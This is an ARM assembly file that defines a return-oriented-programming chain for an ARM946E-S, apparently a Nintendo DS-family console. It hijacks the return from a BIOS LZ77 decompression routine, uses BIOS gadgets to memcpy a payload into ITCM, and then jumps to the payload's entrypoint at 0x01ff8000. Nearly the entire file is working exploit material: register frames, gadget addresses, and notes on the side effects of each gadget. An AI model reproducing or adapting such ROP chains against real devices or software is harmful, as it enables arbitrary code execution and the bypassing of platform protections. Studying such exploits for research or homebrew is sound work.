@ vim: set ft=armv5 noet:

	.arch armv5te
	.cpu  arm946e-s

	.section .ropchain, "awx", %progbits

	.extern __dtcm_size_4b

	.arm
	.global ROPCHAIN
	.type ROPCHAIN, %object
ROPCHAIN:

	@@ first frame: end of swi_LZ77UnCompReadByCallbackWrite8bit @ 0xffff5200
	@@ sp = 0x02ffbb6c

	@ r3, fill
	.4byte 0xdeadbeef
	@ r4
	.4byte memcpy_dest
	@ r5
	.4byte memcpy_srclen
	@ r6-r11: 24 bytes, so enjoy some filler
	.byte 0x0a,0x20,0x20,0x20,0x20,0x0a
	.byte 0xf0,0x9f,0x8f,0xb3,0xef,0xb8,0x8f,0xe2,0x80,0x8d,0xe2,0x9a,0xa7,0xef,0xb8,0x8f
	.byte 0x0a,0x00
	@ lr
	.4byte 0xffff29ec
	@ r4-r6 (filler)
	.4byte 0,0,0
	@ pc (payload entrypoint!)
	.4byte 0x01ff8000


	.type ropchain_data, %object
ropchain_data:

/*
Do note that the code after the `memcpy_unalign` call, the code will necessarily:
* Store `r2>>2` for the `memcpy_unalign` call at `*(r4+4)`
* Zero out the first byte of the source
* Copy `*(r5+12)` to `*(r4+12)`
*/

memcpy_srclen:
	.4byte __itcm_lma      @ source address
	.4byte __itcm_size_4   @ length (in 4-byte units)
	.4byte 0  @ padding
	.4byte 0  @ will be read from by insn @ 0xffff2a20
memcpy_dest:
	.4byte __itcm_start @ ITCM
	.4byte 0  @ will be written to by insn @ 0xffff2a08
	.4byte 0  @ padding
	.4byte 0  @ will be written to by insn @ 0xffff2a24


	.global ROPCHAIN_END
	.type ROPCHAIN, %object
ROPCHAIN_END:
